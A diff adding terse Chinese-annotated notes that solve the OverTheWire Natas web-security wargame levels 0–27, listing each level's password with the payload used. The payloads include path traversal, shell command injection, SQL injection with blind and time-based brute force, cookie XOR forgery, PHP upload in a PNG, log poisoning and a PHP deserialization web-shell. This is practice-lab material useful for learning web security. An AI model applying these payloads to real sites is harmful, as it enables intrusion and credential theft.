@@ -1,0 +1,204 @@
+<h1>natas0</h1>
+<div id="content">
+You can find the password for the next level on this page.
+
+<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
+</div>
+</body>
+</html>
+
+
+<h1>natas1</h1>
+<div id="content">
+You can find the password for the
+next level on this page, but rightclicking has been blocked!
+
+<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
+</div>
+</body>
+</html>
+
+<h1>natas2</h1>
+<div id="content">
+There is nothing on this page
+<img src="files/pixel.png">
+</div>
+</body></html>
+
+http://natas2.natas.labs.overthewire.org/files/
+# username:password
+alice:BYNdCesZqW
+bob:jw2ueICLvT
+charlie:G5vCxkVV3m
+natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
+eve:zo4mJWyNj2
+mallory:9urtcpzBmH
+
+google找不到那就是robots啦
+http://natas3.natas.labs.overthewire.org/robots.txt
+http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
+
+http://natas4.natas.labs.overthewire.org/改referer
+Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq 
+
+http://natas5.natas.labs.overthewire.org/index.php改cookie
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
+
+http://natas6.natas.labs.overthewire.org/includes/secret.inc
+Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+
+natas7.natas.labs.overthewire.org/index.php?page=../../../../../../etc/natas_webpass/natas8
+DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
+
+oubWYf2kBq
+Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
+
+--help; cat /etc/natas_webpass/natas10; ls --help 
+nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
+
+.* /etc/natas_webpass/natas11 
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+
+http://natas11.natas.labs.overthewire.org/index-source.html
+// #ffffff
+>>> a=base64.b64decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw==')
+// #000000
+>>> b=base64.b64decode('ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSRwh6QUcIaAw==')
+可看出最后9bits是bgcolor
+>>> xor = lambda a,b: ''.join([chr(ord(c)^ord(d)) for (c,d) in zip(a,b)])
+>>> xor(a[-9:], 'fffffffff')
+'4w8Jqw8\x0ej'
+>>> xor(b[-9:], '000000000')
+'bw8Jqw8X<'
+看出密钥含有'w8Jqw8'
+>>> xor(a[0], '{')
+'q'
+以q开头
+所以密钥是'qw8J'
+>>> xor(b, 'qw8J'*20)
+'{"showpassword":"no","bgcolor":"#000000"}'
+>>> base64.b64encode(xor('{"showpassword":"yes","bgcolor":"#000000"}', 'qw8J'*100))
+'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVAh6QUcIelMK'
+The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
+
+http://natas12.natas.labs.overthewire.org/index-source.html
+<?php
+    echo file_get_contents('/etc/natas_webpass/natas13');
+?>
+<input type="hidden" name="filename" value="1.php">
+jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
+
+把那张一像素透明png插入php代码
+<input type="hidden" name="filename" value="1.php">
+‰PNG  IHDR%ÛVÊgAMA±üasRGB®Îé cHRMz&€„ú€èu0ê`:˜pœºQ<�PLTEÿÿÿÿÿÿU|õltRNS@æØfbKGDˆH	pHYsHHFÉk> IDAT×c`â!¼3%tEXtdate:create2012-09-17T15:24:23+02:00øV¦%tEXtdate:modify2008-01-02T23:13:08+01:00„k>IEND®B`‚Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
+
+http://natas14.natas.labs.overthewire.org/
+admin" or "1
+uccessful login! The password for natas15 is AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
+
+
+POST /index.php HTTP/1.1
+Host: natas15.natas.labs.overthewire.org
+...
+username=natas16%22+and+password+LIKE+BINARY+%22WaIHEacj63wnNIBROHeqi3p9t0m5nhmh§a§%25
+
+
+http://natas16.natas.labs.overthewire.org/
+GET /index.php?needle=aftermaths%24%28egrep+-o+%5E8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw§a§+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search HTTP/1.1
+Host: natas16.natas.labs.overthewire.org
+...
+
+http://natas17.natas.labs.overthewire.org/
+POST /index.php HTTP/1.1
+Host: natas17.natas.labs.overthewire.org
+...
+
+username=natas18%22+and+password+like+binary+%22xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP§a§%25%22+and+sleep(1)+and+"1
+
+
+GET /index.php?debug=1 HTTP/1.1
+Host: natas18.natas.labs.overthewire.org
+...
+Cookie: __cfduid=dcec41bd23df8f3a0ce5429d8bf414bea1424881795; __utma=176859643.1664857517.1424881797.1441279232.1441286008.11; __utmc=176859643; __utmz=176859643.1424881797.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=46
+Connection: close
+
+DEBUG: Session start ok<br>You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+GET /index.php HTTP/1.1
+Host: natas19.natas.labs.overthewire.org
+...
+Cookie: __cfduid=dcec41bd23df8f3a0ce5429d8bf414bea1424881795; __utma=176859643.1664857517.1424881797.1441279232.1441286008.11; __utmc=176859643; __utmz=176859643.1424881797.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=3338312d61646d696e
+Connection: close
+
+You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
+
+
+POST /index.php HTTP/1.1
+Host: natas20.natas.labs.overthewire.org
+...
+
+name=1%0aadmin+1
+
+DEBUG: MYREAD totbvqke0d64f3fuh06q1sdfh2
+DEBUG: Reading from /var/lib/php5/mysess_totbvqke0d64f3fuh06q1sdfh2
+DEBUG: Read [name 1]
+DEBUG: Read [admin 1]
+DEBUG: Read []
+You are an admin. The credentials for the next level are:
+Username: natas21
+Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
+
+http://natas21-experimenter.natas.labs.overthewire.org/index.php
+提交admin=1，回那边改sessid
+http://natas21.natas.labs.overthewire.org/index.php
+You are an admin. The credentials for the next level are:
+Username: natas22
+Password: chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
+
+http://natas22.natas.labs.overthewire.org/index.php?revelio=1
+直接抓下来
+You are an admin. The credentials for the next level are:<br><pre>Username: natas23
+Password: D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</pre>
+<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+
+http://natas23.natas.labs.overthewire.org/index.php?passwd=1e9iloveyou
+The credentials for the next level are:
+Username: natas24 Password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+http://natas24.natas.labs.overthewire.org/index.php?passwd[]=t
+Warning: strcmp() expects parameter 1 to be string, array given in /var/www/natas/natas24/index.php on line 23
+
+The credentials for the next level are:
+Username: natas25 Password: GHF6X7YwACaYYssHVY05cFq83hRktl4c
+
+http://natas25.natas.labs.overthewire.org/index.php?lang=../
+GET /index.php?lang=../ HTTP/1.1
+Host: natas25.natas.labs.overthewire.org
+Proxy-Connection: keep-alive
+Authorization: Basic bmF0YXMyNTpHSEY2WDdZd0FDYVlZc3NIVlkwNWNGcTgzaFJrdGw0Yw==
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Upgrade-Insecure-Requests: 1
+User-Agent: <?php echo file_get_contents("/etc/natas_webpass/natas26");?>
+DNT: 1
+Accept-Encoding: gzip, deflate, sdch
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6,zh-TW;q=0.4
+Cookie: __cfduid=dcec41bd23df8f3a0ce5429d8bf414bea1424881795; __utma=176859643.1664857517.1424881797.1441286008.1441300153.12; __utmb=176859643.1.10.1441300153; __utmc=176859643; __utmz=176859643.1424881797.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=garzon
+
+GET /index.php?lang=..././..././..././..././..././..././..././..././tmp/natas25_garzon.log
+[03.09.2015 17::40:47] oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+ "Directory traversal attempt! fixing request."
+
+http://natas26.natas.labs.overthewire.org/index.php?x1=1&y1=1&x2=1000&y2=2000
+>>> import base64
+>>> base64.b64encode('''a:2:{i:0;a:4:{s:2:"x1";s:1:"1";s:2:"y1";s:1:"1";s:2:"x2";s:3:"100";s:2:"y2";s:3:"100";}i:1;a:5:{s:2:"x1";s:1:"1";s:2:"y1";s:1:"1";s:2:"x2";s:4:"1000";s:2:"y2";s:4:"2000";s:1:"a";O:6:"Logger":3:{s:15:"\0Logger\0logFile";s:14:"img/garzon.php";s:15:"\0Logger\0initMsg";s:1:"a";s:15:"\0Logger\0exitMsg";s:62:"<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>";}}}''')
+'YToyOntpOjA7YTo0OntzOjI6IngxIjtzOjE6IjEiO3M6MjoieTEiO3M6MToiMSI7czoyOiJ4MiI7czozOiIxMDAiO3M6MjoieTIiO3M6MzoiMTAwIjt9aToxO2E6NTp7czoyOiJ4MSI7czoxOiIxIjtzOjI6InkxIjtzOjE6IjEiO3M6MjoieDIiO3M6NDoiMTAwMCI7czoyOiJ5MiI7czo0OiIyMDAwIjtzOjE6ImEiO086NjoiTG9nZ2VyIjozOntzOjE1OiIATG9nZ2VyAGxvZ0ZpbGUiO3M6MTQ6ImltZy9nYXJ6b24ucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MToiYSI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYyOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PiI7fX19'
+
+http://natas26.natas.labs.overthewire.org/img/garzon.php
+55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ 55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
+
+http://natas27.natas.labs.overthewire.org/index.php
+// database gets cleared every 5 min 
+抢先注册natas28，但我就是过不去- -
